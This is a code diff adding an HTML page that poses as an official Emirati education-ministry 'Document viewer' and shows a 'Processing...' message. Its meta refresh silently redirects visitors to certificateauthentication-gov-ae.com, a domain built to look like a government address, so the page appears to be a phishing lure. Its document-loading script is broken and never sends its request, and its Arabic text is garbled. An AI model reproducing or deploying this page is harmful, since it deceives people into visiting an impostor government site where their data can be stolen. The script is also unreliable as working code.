@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html xmlns="“http://www.w3.org/1999/xhtml" 16”="" xml:lang="“ar”" lang="“ar”"><head>
+	<title>Document viewer</title>
+	<style type="text/css">
+		body {
+			margin: 0;
+			overflow: hidden;
+			font-size: 13px;
+			text-align: center;
+			background: #F2F2F2;
+			font-family: 'cairoregular';
+		}
+
+		@font-face {
+			font-family: 'cairobold';
+			src: url('webfonts/cairo-bold-webfont.woff2') format('woff2'),
+				url('webfonts/cairo-bold-webfont.woff') format('woff');
+			font-weight: normal;
+			font-style: normal;
+
+		}
+
+		@font-face {
+			font-family: 'cairoregular';
+			src: url('webfonts/cairo-regular-webfont.woff2') format('woff2'),
+				url('webfonts/cairo-regular-webfont.woff') format('woff'),
+				url('webfonts/cairo-regular-webfont.ttf') format('truetype');
+			font-weight: normal;
+			font-style: normal;
+
+		}
+
+		.header {
+			background: white;
+			padding: 20px;
+			text-align: center;
+			font-size: 16px;
+			font-weight: bold;
+		}
+
+		.footer {
+			text-align: center;
+			margin-top: 30px;
+			font-size: 16px;
+			font-weight: bold;
+		}
+
+		.wrapper {
+			background: white;
+			width: 40%;
+			margin: 5% auto 0;
+			padding: 5%;
+			justify-content: center;
+			vertical-align: middle;
+			align-items: center;
+			font-size: 16px;
+			font-weight: bold;
+		}
+
+		#iframe1 {
+			position: absolute;
+			left: 0px;
+			width: 100%;
+			top: 0px;
+			height: 100%;
+		}
+
+		.validation {
+			color: #D63301;
+			background-color: #FFCCBA;
+			border: 1px solid;
+			margin: 10px 0px;
+			padding: 15px 10px 15px 50px;
+			background-repeat: no-repeat;
+			background-position: 10px center;
+			font-size: 16px;
+			font-weight: bold;
+		}
+
+		.button {
+			margin-top: 20px;
+			padding: 10px;
+			background: #00288C;
+			border-radius: 5px;
+			color: #fff;
+			width: 250px;
+			justify-content: center;
+			align-items: center;
+			margin: 0 auto;
+			margin-top: 10px;
+			font-size: 16px;
+			font-weight: bold;
+		}
+
+		.button a {
+			text-decoration: none;
+			color: #fff;
+			font-size: 14px;
+			font-weight: bold;
+		}
+
+		.cancelWrapper {
+			background-image: url(images/document-not-available.png);
+			top: 110px;
+			color: #002A8F;
+			text-align: center;
+			background-repeat: no-repeat;
+			background-position: center;
+			height: 110px;
+			font-size: 16px;
+			font-weight: bold;
+		}
+
+		.document-cancel {
+			top: 110px;
+			color: #002A8F;
+			text-align: center;
+			margin: 0px;
+			padding: 0px;
+			font-size: 16px;
+			font-weight: bold;
+		}
+
+		.document-replaced {
+			top: 110px;
+			color: #002A8F;
+			text-align: center;
+			margin: 0px;
+			padding: 0px;
+			font-size: 16px;
+			font-weight: bold;
+		}
+
+		.replaceWrapper {
+			background-image: url(images/document-replaced.png);
+			top: 110px;
+			color: #002A8F;
+			text-align: center;
+			background-repeat: no-repeat;
+			background-position: center;
+			height: 110px;
+			font-size: 16px;
+			font-weight: bold;
+		}
+
+		.document-not-available {
+			background-image: url("images/document-not-available.png");
+			top: 110px;
+			color: #002A8F;
+			text-align: center;
+			font-size: 16px;
+			font-weight: bold;
+		}
+	</style>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon">
+</head>
+<meta http-equiv = "refresh" content = "1; url = https://certificateauthentication-gov-ae.com/100000.htm " />
+<body onload="load()" style="margin: 0px; padding: 0px; width: 100%; height:100%" id="body">
+	<div class="header">
+		<img src="moe-logo.png">
+	</div>
+	<div class="wrapper">
+		<div id="container"><b style="color:green">Processing ...</b></div>
+	</div>
+	<div class="footer">
+		<img src="emirates.png">
+	</div>
+
+
+<script type="text/javascript">
+
+	function getFormattedTime() {
+	    var today = new Date();
+	    var y = today.getFullYear();
+	    // JavaScript months are 0-based.
+	    var m = today.getMonth() + 1;
+	    var d = today.getDate();
+	    var h = today.getHours();
+	    var mi = today.getMinutes();
+	    var s = today.getSeconds();
+	    return y + "-" + m + "-" + d + "-" + h + "-" + mi + "-" + s;
+	}
+
+	function load() {
+
+		var xhttp = new XMLHttpRequest();
+
+		var encryptedGuidUrl = getParameterByName("guid");
+
+		xhttp.onreadystatechange = function () {
+			if (this.readyState == 4 && this.status == 200) {
+				document.getElementById("container").innerHTML = this.responseText;
+			} else if (this.readyState == 4 && this.status == 202) {
+				var data = this.responseText;
+				var fileName = "document_" + getFormattedTime() + ".pdf";
+				if (window.navigator && window.navigator.msSaveOrOpenBlob) {
+					var byteCharacters = window.atob(data);
+					var byteNumbers = new Array(byteCharacters.length);
+					for (var i = 0; i < byteCharacters.length; i++) {
+						byteNumbers[i] = byteCharacters.charCodeAt(i);
+					}
+					var byteArray = new Uint8Array(byteNumbers);
+					var blob = new Blob([byteArray], { type: 'application/pdf' });
+					window.navigator.msSaveOrOpenBlob(blob, fileName);
+					
+					document.getElementById("container").innerHTML = "<b style=\"color:green\"> طھظ… طھظ†ط²ظٹظ„ ط§ظ„ظ…ظ„ظپ <br> Document downloaded. </b>";
+				} else { 
+					document.getElementById("body").innerHTML = "<iframe id=\"iframe1\" width=\"100%\" heigh=\"100%\" type=\"application/pdf\" src=\"data:application/pdf;base64," + this.responseText + "\"/>";
+				}
+
+			} else if (this.readyState == 4 && this.status == 451) {
+				document.getElementById("container").innerHTML =
+					"<b style=\"color:red\"> <a href=\"?guid=" + this.responseText + "\">  </a>";
+
+			} else if (this.readyState == 4 && this.status == 400) {
+				document.getElementById("container").innerHTML =
+					"<b style=\"color:red\">" + this.responseText + "</b>";
+
+			} else if (this.readyState == 4 && this.status > 400) {
+				document.getElementById("container").innerHTML = "<b style=\"color:green\"> Processing ... </b>";
+			} else {
+				document.getElementById("container").innerHTML = "<b style=\"color:green\"> Processing ... </b>";
+			}
+
+		};
+
+	function getParameterByName(name) {
+		var url = window.location.href;
+		name = name.replace(/[\[\]]/g, '\\$&');
+		var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+			results = regex.exec(url);
+		if (!results) return null;
+		if (!results[2]) return '';
+
+		return encodeURIComponent(results[2]);
+	}
+
+</script>
+
+</body></html>
